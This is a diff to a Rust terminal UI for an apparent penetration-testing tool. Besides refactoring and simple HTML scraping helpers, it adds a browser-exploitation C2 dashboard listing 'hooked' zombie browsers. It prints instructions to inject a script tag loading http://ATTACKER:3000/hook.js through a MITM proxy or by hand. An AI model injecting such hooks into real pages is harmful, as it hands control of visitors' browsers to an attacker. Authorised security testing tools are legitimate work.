@@ -1,7 +1,6 @@
 // TUI - Full-screen Text User Interface (k9s-style)
 // ZERO external dependencies - pure Rust std only
 
-use crate::modules::web::dom::Document;
 use crate::storage::session::SessionFile;
 use std::collections::HashMap;
 use std::io::{self, Read, Write, BufRead, BufReader};
@@ -9,6 +8,25 @@ use std::process::{Command as ProcessCommand, Stdio};
 use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
 use std::time::Duration;
+
+/// Truncate a string to max_len characters, adding "..." if truncated
+fn truncate_str(s: &str, max_len: usize) -> String {
+    if s.len() <= max_len {
+        s.to_string()
+    } else if max_len > 3 {
+        format!("{}...", &s[..max_len - 3])
+    } else {
+        s[..max_len].to_string()
+    }
+}
+
+/// Get current time in seconds since UNIX epoch
+fn now_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
+}
 
 /// TUI Input Key
 #[derive(Debug, Clone, Copy)]
@@ -85,6 +103,7 @@ mod ansi {
     pub const RESET: &str = "\x1b[0m";
     pub const BOLD: &str = "\x1b[1m";
     pub const DIM: &str = "\x1b[2m";
+    pub const REVERSE: &str = "\x1b[7m";
     pub const BLACK: &str = "\x1b[30m";
     pub const RED: &str = "\x1b[31m"; // Error/CrashLoopBackOff
     pub const GREEN: &str = "\x1b[32m"; // Running/Success
@@ -171,6 +190,7 @@ pub enum ViewMode {
     Sessions,   // Session metadata & history
     DNS,        // [7] DNS records (A, MX, NS, TXT, etc)
     HTTP,       // [8] HTTP headers & web security
+    RBB,        // [R] RedBlue Browser - hooked browsers C2 dashboard
     Activity,   // [0] Scan activity log (last tab)
     Normal,     // Scan activity: normal profile timeline
     Stealth,    // Scan activity: stealth profile timeline
@@ -190,6 +210,7 @@ impl ViewMode {
             ViewMode::Sessions => "Sessions",
             ViewMode::DNS => "DNS Records",
             ViewMode::HTTP => "HTTP Security",
+            ViewMode::RBB => "RBB Zombies",
             ViewMode::Activity => "Activity Log",
             ViewMode::Normal => "Normal Profile",
             ViewMode::Stealth => "Stealth Profile",
@@ -208,7 +229,8 @@ impl ViewMode {
             ViewMode::Whois => ViewMode::Sessions,
             ViewMode::Sessions => ViewMode::DNS,
             ViewMode::DNS => ViewMode::HTTP,
-            ViewMode::HTTP => ViewMode::Activity,
+            ViewMode::HTTP => ViewMode::RBB,
+            ViewMode::RBB => ViewMode::Activity,
             ViewMode::Activity => ViewMode::Overview,
             ViewMode::Normal => ViewMode::Stealth,
             ViewMode::Stealth => ViewMode::Aggressive,
@@ -228,7 +250,8 @@ impl ViewMode {
             ViewMode::Sessions => ViewMode::Whois,
             ViewMode::DNS => ViewMode::Sessions,
             ViewMode::HTTP => ViewMode::DNS,
-            ViewMode::Activity => ViewMode::HTTP,
+            ViewMode::RBB => ViewMode::HTTP,
+            ViewMode::Activity => ViewMode::RBB,
             ViewMode::Normal => ViewMode::Activity,
             ViewMode::Stealth => ViewMode::Normal,
             ViewMode::Aggressive => ViewMode::Stealth,
@@ -259,13 +282,16 @@ pub struct TuiApp {
     size: TermSize,
     metadata: Option<crate::storage::session::SessionMetadata>,
     // Data for different views
-    network_data: Vec<TableRow>, // Network devices (NEW!)
+    network_data: Vec<TableRow>, // Network devices
     ports_data: Vec<TableRow>,
     subdomains_data: Vec<TableRow>,
     whois_data: Vec<(String, String)>,    // Key-value pairs
     certs_data: Vec<(String, String)>,    // Key-value pairs
     sessions_data: Vec<(String, String)>, // Key-value pairs
     scan_activity: Vec<String>,           // Real-time scan logs
+    // RBB (RedBlue Browser) zombie tracking
+    rbb_zombies: Vec<TableRow>,           // Hooked browser zombies
+    rbb_server_addr: Option<String>,      // RBB server address if running
     // Auto-refresh and background scanning
     last_refresh: std::time::Instant, // Last time data was refreshed
     auto_refresh_enabled: bool,       // Enable auto-refresh on tab switch
@@ -276,9 +302,9 @@ pub struct TuiApp {
     // Session variables (in-memory only, not persisted)
     session_variables: HashMap<String, String>,
     // Scraping state
-    current_doc: Option<Document>,      // Currently loaded HTML document
+    current_doc: Option<String>,        // Currently loaded HTML document (raw HTML)
     current_doc_url: String,            // URL of the current document
-    last_selector_results: Vec<usize>,  // Element indices from last $ command
+    last_selector_results: Vec<String>, // Snippets from last $ command
     // Event channel
     tx: Sender<Event>,
     rx: Receiver<Event>,
@@ -326,6 +352,8 @@ impl TuiApp {
             certs_data: Vec::new(),
             sessions_data: Vec::new(),
             scan_activity: Vec::new(),
+            rbb_zombies: Vec::new(),
+            rbb_server_addr: None,
             last_refresh: std::time::Instant::now(),
             auto_refresh_enabled: true,
             network_scan_running: false,
@@ -483,10 +511,10 @@ impl TuiApp {
 
         for scan in &port_scans {
             let status_str = match scan.status {
-                crate::storage::schema::PortStatus::Open => "Open",
-                crate::storage::schema::PortStatus::Closed => "Closed",
-                crate::storage::schema::PortStatus::Filtered => "Filtered",
-                crate::storage::schema::PortStatus::OpenFiltered => "Open|Filtered",
+                crate::storage::records::PortStatus::Open => "Open",
+                crate::storage::records::PortStatus::Closed => "Closed",
+                crate::storage::records::PortStatus::Filtered => "Filtered",
+                crate::storage::records::PortStatus::OpenFiltered => "Open|Filtered",
             };
 
             self.ports_data.push(TableRow {
@@ -512,10 +540,10 @@ impl TuiApp {
                 .join(", ");
 
             let source_str = match sub.source {
-                crate::storage::schema::SubdomainSource::DnsBruteforce => "DNS",
-                crate::storage::schema::SubdomainSource::CertTransparency => "CT",
-                crate::storage::schema::SubdomainSource::SearchEngine => "Search",
-                crate::storage::schema::SubdomainSource::WebCrawl => "Crawl",
+                crate::storage::records::SubdomainSource::DnsBruteforce => "DNS",
+                crate::storage::records::SubdomainSource::CertTransparency => "CT",
+                crate::storage::records::SubdomainSource::SearchEngine => "Search",
+                crate::storage::records::SubdomainSource::WebCrawl => "Crawl",
             };
 
             self.subdomains_data.push(TableRow {
@@ -538,7 +566,7 @@ impl TuiApp {
         Ok(())
     }
 
-    fn build_network_rows(port_scans: &[crate::storage::schema::PortScanRecord]) -> Vec<TableRow> {
+    fn build_network_rows(port_scans: &[crate::storage::records::PortScanRecord]) -> Vec<TableRow> {
         #[derive(Default)]
         struct Aggregate {
             open_ports: Vec<u16>,
@@ -556,14 +584,14 @@ impl TuiApp {
             entry.last_seen = entry.last_seen.max(scan.timestamp as u64);
 
             match scan.status {
-                crate::storage::schema::PortStatus::Open => {
+                crate::storage::records::PortStatus::Open => {
                     entry.open_ports.push(scan.port);
                 }
-                crate::storage::schema::PortStatus::Filtered
-                | crate::storage::schema::PortStatus::OpenFiltered => {
+                crate::storage::records::PortStatus::Filtered
+                | crate::storage::records::PortStatus::OpenFiltered => {
                     entry.filtered_ports.push(scan.port);
                 }
-                crate::storage::schema::PortStatus::Closed => {
+                crate::storage::records::PortStatus::Closed => {
                     entry.closed_count += 1;
                 }
             }
@@ -647,6 +675,7 @@ impl TuiApp {
             ViewMode::Network => &self.network_data,
             ViewMode::Ports => &self.ports_data,
             ViewMode::Subdomains => &self.subdomains_data,
+            ViewMode::RBB => &self.rbb_zombies,
             _ => &[], // Non-table views
         }
     }
@@ -991,11 +1020,16 @@ impl TuiApp {
             (7, "WHOIS", ViewMode::Whois),
             (8, "DNS", ViewMode::DNS),
             (9, "HTTP", ViewMode::HTTP),
-            (0, "Activity", ViewMode::Activity), // Last tab
+        ];
+        // Additional tabs (not in numbered array)
+        let extra_tabs = [
+            ("R", "RBB", ViewMode::RBB),           // [R] RedBlue Browser C2
+            ("0", "Activity", ViewMode::Activity), // [0] Activity log
         ];
 
         print!("{}", ansi::move_to(2, 1));
 
+        // Render numbered tabs (1-9)
         for (num, label, mode) in tabs.iter() {
             let is_active = std::mem::discriminant(&self.mode) == std::mem::discriminant(mode);
 
@@ -1008,6 +1042,21 @@ impl TuiApp {
                 // Inactive tab: dim gray text
                 print!("{}", ansi::DIM);
                 print!(" [{}] {} ", num, label);
+                print!("{}", ansi::RESET);
+            }
+        }
+
+        // Render extra tabs (R, 0)
+        for (key, label, mode) in extra_tabs.iter() {
+            let is_active = std::mem::discriminant(&self.mode) == std::mem::discriminant(mode);
+
+            if is_active {
+                print!("{}{}{}", ansi::BG_BRIGHT_CYAN, ansi::BLACK, ansi::BOLD);
+                print!(" [{}] {} ", key, label);
+                print!("{}", ansi::RESET);
+            } else {
+                print!("{}", ansi::DIM);
+                print!(" [{}] {} ", key, label);
                 print!("{}", ansi::RESET);
             }
         }
@@ -1060,6 +1109,7 @@ impl TuiApp {
             | ViewMode::Services
             | ViewMode::DNS
             | ViewMode::HTTP => self.render_table(content_start_row, available_rows)?,
+            ViewMode::RBB => self.render_rbb(content_start_row, available_rows)?,
             ViewMode::Whois | ViewMode::Certs | ViewMode::Sessions => {
                 self.render_keyvalue(content_start_row, available_rows)?
             }
@@ -1417,6 +1467,127 @@ impl TuiApp {
         Ok(())
     }
 
+    /// Render RBB (RedBlue Browser) zombie dashboard
+    fn render_rbb(&self, start_row: u16, available_rows: usize) -> Result<(), String> {
+        let mut row = start_row;
+
+        // Header with server status
+        println!("{}{}{}", ansi::move_to(row, 2), ansi::BOLD, ansi::CYAN);
+        print!("RBB - Browser Exploitation Dashboard");
+        if let Some(ref addr) = self.rbb_server_addr {
+            print!(" {}[Server: {}]{}", ansi::GREEN, addr, ansi::CYAN);
+        } else {
+            print!(" {}[Server: Not Running]{}", ansi::YELLOW, ansi::CYAN);
+        }
+        println!("{}", ansi::RESET);
+        row += 2;
+
+        // Hook URL info
+        if let Some(ref addr) = self.rbb_server_addr {
+            println!(
+                "{}  {}Hook URL:{} http://{}/hook.js",
+                ansi::move_to(row, 2),
+                ansi::ORANGE,
+                ansi::RESET,
+                addr
+            );
+            row += 1;
+            println!(
+                "{}  {}Inject:{} <script src=\"http://{}/hook.js\"></script>",
+                ansi::move_to(row, 2),
+                ansi::ORANGE,
+                ansi::RESET,
+                addr
+            );
+            row += 2;
+        }
+
+        // Zombies table header
+        println!(
+            "{}  {}ID              IP              OS          Page                  Last Seen{}",
+            ansi::move_to(row, 2),
+            ansi::BOLD,
+            ansi::RESET
+        );
+        row += 1;
+        println!(
+            "{}  {}{}{}",
+            ansi::move_to(row, 2),
+            ansi::DIM,
+            "-".repeat(78.min(self.size.cols as usize - 4)),
+            ansi::RESET
+        );
+        row += 1;
+
+        if self.rbb_zombies.is_empty() {
+            println!(
+                "{}  {}No hooked browsers yet{}",
+                ansi::move_to(row, 2),
+                ansi::DIM,
+                ansi::RESET
+            );
+            row += 2;
+
+            // Instructions
+            println!(
+                "{}  {}To hook browsers:{}",
+                ansi::move_to(row, 2),
+                ansi::ORANGE,
+                ansi::RESET
+            );
+            row += 1;
+            println!(
+                "{}    1. Start RBB server: {}:rbb serve{}",
+                ansi::move_to(row, 2),
+                ansi::CYAN,
+                ansi::RESET
+            );
+            row += 1;
+            println!(
+                "{}    2. Use MITM proxy to inject hook: {}:mitm --hook http://ATTACKER:3000/hook.js{}",
+                ansi::move_to(row, 2),
+                ansi::CYAN,
+                ansi::RESET
+            );
+            row += 1;
+            println!(
+                "{}    3. Or manually inject: {}<script src=\"http://ATTACKER:3000/hook.js\"></script>{}",
+                ansi::move_to(row, 2),
+                ansi::CYAN,
+                ansi::RESET
+            );
+        } else {
+            // Render zombie list (use TableRow format)
+            for (i, zombie) in self.rbb_zombies.iter().enumerate() {
+                if row >= start_row + available_rows as u16 - 2 {
+                    break;
+                }
+
+                let is_selected = i == self.selected_row;
+                let prefix = if is_selected { ">" } else { " " };
+                let highlight = if is_selected { ansi::REVERSE } else { "" };
+                let reset = if is_selected { ansi::RESET } else { "" };
+
+                // TableRow: module=ID, status=IP, data=Page
+                println!(
+                    "{}{}{}  {:<14} {:<14} {:<10} {:<20} {}{}",
+                    ansi::move_to(row, 2),
+                    highlight,
+                    prefix,
+                    &zombie.module,    // Zombie ID
+                    &zombie.status,    // IP address
+                    "Unknown",         // OS (could be parsed from data)
+                    truncate_str(&zombie.data, 20), // Page
+                    if zombie.timestamp > 0 { format!("{}s ago", now_secs() - zombie.timestamp) } else { "?".to_string() },
+                    reset
+                );
+                row += 1;
+            }
+        }
+
+        Ok(())
+    }
+
     /// Render scan activity (for Normal, Stealth, Aggressive modes)
     fn render_scan_activity(&self, start_row: u16, available_rows: usize) -> Result<(), String> {
         let mut row = start_row;
@@ -1473,6 +1644,7 @@ impl TuiApp {
             ViewMode::Ports => " [:scan ports] [:]Commands [d]Delete [r]Refresh ",
             ViewMode::Subdomains => " [:scan subdomains] [:recon domain subdomains] [:]Commands ",
             ViewMode::Overview => " [1-9,0]Switch view [:]Commands [r]Refresh [q]Quit ",
+            ViewMode::RBB => " [:rbb serve] [:rbb list] [:rbb exec] [:]Commands [q]Quit ",
             _ => " [1-9,0]Views [j/k/↑↓]Scroll [PgUp/Dn]Page [:]Cmd [r]Refresh [q]Quit ",
         };
 
@@ -1541,8 +1713,9 @@ impl TuiApp {
             Key::Char('6') => self.switch_view(ViewMode::Whois)?,
             Key::Char('7') => self.switch_view(ViewMode::DNS)?,
             Key::Char('8') => self.switch_view(ViewMode::HTTP)?,
+            Key::Char('9') => self.switch_view(ViewMode::RBB)?,  // RBB Browser C2 dashboard
             Key::Char('0') => self.switch_view(ViewMode::Activity)?,
-            
+
             Key::Tab => {
                 let next_mode = self.mode.next();
                 self.switch_view(next_mode)?;
@@ -2209,12 +2382,147 @@ impl TuiApp {
 
         Ok(())
     }
+
+    // ========== View & Scraping Methods ==========
+
+    fn switch_view(&mut self, mode: ViewMode) -> Result<(), String> {
+        self.mode = mode;
+        self.scroll_offset = 0;
+        self.selected_row = 0;
+        self.load_database_data()
+    }
+
+    fn refresh_current_view(&mut self) -> Result<(), String> {
+        self.load_session()?;
+        self.load_database_data()
+    }
+
+    fn execute_scrap(&mut self, url: &str) -> Result<(), String> {
+        use crate::protocols::http::{HttpClient, HttpRequest};
+        self.scan_activity.push(format!("Fetching: {}", url));
+        let client = HttpClient::new();
+        let req = HttpRequest::get(url);
+        match client.send(&req) {
+            Ok(resp) => {
+                let body = String::from_utf8_lossy(&resp.body).to_string();
+                self.current_doc = Some(body.clone());
+                self.current_doc_url = url.to_string();
+                self.scan_activity.push(format!("Loaded {} bytes", body.len()));
+                Ok(())
+            }
+            Err(e) => { self.scan_activity.push(format!("Failed: {}", e)); Err(e) }
+        }
+    }
+
+    fn execute_selector_query(&mut self, selector: &str) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document loaded")?;
+        self.last_selector_results.clear();
+        let open_tag = format!("<{}", selector.to_lowercase());
+        let mut count = 0;
+        for (i, _) in doc.to_lowercase().match_indices(&open_tag) {
+            count += 1;
+            if count <= 10 { self.last_selector_results.push(doc[i..(i+100).min(doc.len())].to_string()); }
+        }
+        self.scan_activity.push(format!("Found {} matches", count));
+        Ok(())
+    }
+
+    fn execute_selector_text(&mut self) -> Result<(), String> {
+        if self.last_selector_results.is_empty() { return Err("No results".to_string()); }
+        for (i, r) in self.last_selector_results.iter().enumerate() {
+            let text: String = r.chars().fold((String::new(), false), |(mut a, t), c| {
+                if c == '<' { (a, true) } else if c == '>' { (a, false) } else if !t { a.push(c); (a, false) } else { (a, true) }
+            }).0;
+            self.scan_activity.push(format!("[{}] {}", i, text.trim()));
+        }
+        Ok(())
+    }
+
+    fn execute_selector_attr(&mut self, attr: &str) -> Result<(), String> {
+        if self.last_selector_results.is_empty() { return Err("No results".to_string()); }
+        let pat = format!("{}=\"", attr);
+        for (i, r) in self.last_selector_results.iter().enumerate() {
+            if let Some(s) = r.find(&pat) {
+                let vs = s + pat.len();
+                if let Some(e) = r[vs..].find('"') { self.scan_activity.push(format!("[{}] {}={}", i, attr, &r[vs..vs+e])); }
+            }
+        }
+        Ok(())
+    }
+
+    fn execute_selector_html(&mut self) -> Result<(), String> {
+        if self.last_selector_results.is_empty() { return Err("No results".to_string()); }
+        for (i, r) in self.last_selector_results.iter().enumerate() { self.scan_activity.push(format!("[{}] {}", i, r)); }
+        Ok(())
+    }
+
+    fn execute_extract_links(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        let mut links = Vec::new();
+        let mut pos = 0;
+        while let Some(s) = doc[pos..].find("href=\"") {
+            let vs = pos + s + 6;
+            if let Some(e) = doc[vs..].find('"') { if !links.contains(&doc[vs..vs+e].to_string()) { links.push(doc[vs..vs+e].to_string()); } }
+            pos = vs + 1;
+        }
+        self.scan_activity.push(format!("Found {} links", links.len()));
+        for l in links.iter().take(20) { self.scan_activity.push(format!("  {}", l)); }
+        Ok(())
+    }
+
+    fn execute_extract_images(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("Images: {} found", doc.matches("<img").count()));
+        Ok(())
+    }
+
+    fn execute_extract_forms(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("Forms: {} found", doc.matches("<form").count()));
+        Ok(())
+    }
+
+    fn execute_extract_meta(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("Meta tags: {} found", doc.matches("<meta").count()));
+        Ok(())
+    }
+
+    fn execute_extract_og(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("OG tags: {} found", doc.matches("property=\"og:").count()));
+        Ok(())
+    }
+
+    fn execute_extract_jsonld(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("JSON-LD: {} found", doc.matches("application/ld+json").count()));
+        Ok(())
+    }
+
+    fn execute_extract_scripts(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("Scripts: {} found", doc.matches("<script").count()));
+        Ok(())
+    }
+
+    fn execute_extract_css(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("Stylesheets: {} found", doc.matches("rel=\"stylesheet\"").count()));
+        Ok(())
+    }
+
+    fn execute_extract_table(&mut self) -> Result<(), String> {
+        let doc = self.current_doc.as_ref().ok_or("No document")?;
+        self.scan_activity.push(format!("Tables: {} found", doc.matches("<table").count()));
+        Ok(())
+    }
 }
 
 #[cfg(test)]
 mod tests {
     use super::TuiApp;
-    use crate::storage::schema::{PortScanRecord, PortStatus};
+    use crate::storage::records::{PortScanRecord, PortStatus};
     use std::net::{IpAddr, Ipv4Addr};
 
     fn port_scan(ip: [u8; 4], port: u16, status: PortStatus, ts: u32) -> PortScanRecord {
